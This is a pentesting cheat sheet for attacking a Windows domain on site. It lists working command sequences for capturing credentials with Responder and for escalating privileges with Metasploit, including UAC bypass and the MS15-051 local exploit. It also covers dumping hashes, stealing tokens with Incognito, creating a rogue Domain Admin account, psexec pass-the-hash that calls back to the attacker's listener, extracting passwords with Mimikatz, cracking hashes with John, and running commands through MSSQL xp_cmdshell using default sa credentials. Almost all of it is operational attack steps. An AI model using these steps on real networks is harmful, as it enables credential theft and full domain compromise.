### Little Cheat Sheet for ON-SITE PENTESTING

Useful Tools:
	. Responder
	. Metasploit
	. Incognito
	. Mimikatz

Responder:
	. To get plain creds use: responder.py -I eth0 -wFb
        . To get NTLM Hashes use: responder.py -I eth0 -wF
        . To Sniff all suported protocols use: responder.py –I eth0

Metasploit:
	. Who am i: getuid

	. Get system info: sysinfo
		. Important things here are: Architecture, Domain, Meterpreter
		. If Meterpreter and Architecture are not the same is necessary migrate a process with the same Architecture than the OS

	. Migrate to process:
		. In meterpreter:
			. ps # => Get architecture Proccess PID
			. migrate {PID}

	. List user privileges:
		. In meterpreter: background
		. In msf:
			. use post/windows/gather/win_privs
			. set session {SESSION_NUM}
			. exploit

	. Privilage Escalatiom:
		. In meterpreter (migrated to an correct architecture process):
			. use priv
			. getsystem
			. getuid

		. If the above fail:
			. UAC Bypass:
				. In meterpreter:
					. background
					. use exploit/windows/local/bypassuac
					. use exploit/windows/local/bypassuac_injection

			. Another ways to get System:
				. In meterpreter:
					. shell
					. In CMD:
						. wmic qfe list # => Get Installed Patches and Updates
						. back to meterpreter with Ctrl+C

				. In meterpreter:
					. use exploit/windows/local/{Select Exploit} # => Select a exploit depends of the Patches Installed in the system
					. Example: 
						. use exploit/windows/local/ms15_051_client_copy_image
						. set session {SESSION_NUM}
						. set target {TARGET_NUM} # => x86 or x64
						. set payload {PAYLOAD/ARCH/ETC}
						. exploit
						. receive new connection
						. getuid

			. Get Hashes:
				. In meterpreter:
					. hashdump

				. Other way:
					. In meterpreter:
						. background
						. use post/windows/gather/credentials/credential_collector
						. set session {SESSION_NUM}
						. exploit
						. creds # => List stolen credentials

	. Get DOMAIN CONTROLLER IP:
		. In meterpreter: background
		. In msf:
			. use post/windows/gather/enum_domain
			. set session {SESSION_NUM}
			. exploit

	. List DOMAIN ADMIN Accounts:
		. In meterpreter: background
		. In msf:
			. use post/windows/gather/enum_domain_group_users
			. set group "domain admins"
			. set session {SESSION_NUM}
			. exploit

		. Other method: 
			. From meterpreter:
				. shell
			. In CMD:
				. net groups "domain admins" /domain

Incognito:
	Requirements:
		. Valid meterpreter session
		. Migrate to a process with the same architecture of the OS
		. Optional but perfect: Get System

	. Load incognito in meterpreter session: use incognito
	
	. Kind of Tokens:
		Delegation: Are used on interactive sessions, like rdp login # => Amazing for RDP
		Impersonation: Are used on passive sessions, like shared network devices
		IMPORTANT: Both kind of Token works for create DOMAIN CONTROLLER USERS!!!

	. List Tokens and Impoersonate Tokens:
		. In meterpreter:
			. list_tokens -u | list_tokens -g # => Search for Domain Controller Session is the main idea
			. impersonate_token {TOKEN_ID} # => The separator bar must be "\\" to avoid bugs
			. Example: DOMAIN\\boss

		. Create DOMAIN CONTROLER USER (if the above work):
			. In meterpreter:
				. shell
			. In CMD:
				. net user {USERNAME} {PASSWORD} /add /domain
				. net group "Domain Admins" {USERNAME} /add /domain
				. After this:
					. Use the new user to RDP any network machine.
					. Use psexec to pass the hash:
					  . Exit shell: Ctrl+C
					  . In Meterpreter:
					  	. background
					  	. use exploit/windows/smb/psexec
					  	. set target 1 # => USE POWERSHELL TO AVOID AV
					  	. set rhost {IP}
					  	. set SMBDomain {DOMAIN}
					  	. set SMBUser {USERNAME}
					  	. set SMBPass {PASSWORD}
					  	. set payload {PAYLOAD/ARCH/ETC}
					  	. set lhost {LOCAL_IP}
					  	. set lport {LOCAL_IP_FOR_SHELL}
					  	. exploit -j
					  	. Wait for new shell


Mimikatz:
	Requirements:
		. Valid meterpreter session
		. Migrate to a process with the same architecture of the OS
		. Optional but perfect: Get System

	. Load Mimikatz in meterpreter session: load mimikatz

	. In meterpreter:
		. Native in Metasploit:
			. Get NTLM/LM hashes:
				. msv
			. Get KERBEROS credentials in plain text:
				. kerberos

		. Native Mimikatz:		
			. Get full command list:
				. mimikatz_command -f fu::
		    . Get NTLM/LM hashes:
				. mimikatz_command -f samdump::hashes
			. Get IN-MEMORY plain text passwords:
				. mimikatz_command -f sekurlsa::searchPasswords
			. Play with Services:
				. mimikatz_command -f service::
				. mimikatz_command -f service::list
				. mimikatz_command -f service::start
				. mimikatz_command -f service::stop
			. Play with Crypto:
				. mimikatz_command -f crypto::
				. mimikatz_command -f crypto::listProviders
			. List/kill processes and impersonate user tokens:
				. mimikatz_command -f handle::
				. mimikatz_command -f handle::list
				. mimikatz_command -f handle::processStop
				. mimikatz_command -f handle::tokenImpersonate

Crack Hashes with John: 
	. NTLMv2:
		john /usr/share/responder/logs/{file-ip.txt} –wordlist={path}
	. NTLM: # => hashdump
		john --format=NT {hash_file.txt} –wordlist={path}

SQL Server Default Databases:
	. RECON:
		. NMAP:
			. nmap -sU -p 1434 -sV {NETWORK_SEGMENT}
		. In msf:
			. use auxiliary/scanner/mssql/mssql_ping
			. set RHOSTS {RANGE_OF_HOSTS}
			. EXPLOIT

		. Other way:
			. In msf:
				. use auxiliary/scanner/mssql/mssql_login => List Users + Funciones (I'm searching for xp_cmdshell function) 
				. If the funciton xp_cmdshell is listed and the 'sa' user login is default:
					. SET CMD '{COMMAND}'
					. exploit
					. Wait command output 

	. DEFAULT SQL SERVER CREDS:
		. SQL Server 2008/R2 Express => sa:empty
		. SQL Server 201x Express => sa:Password123
	

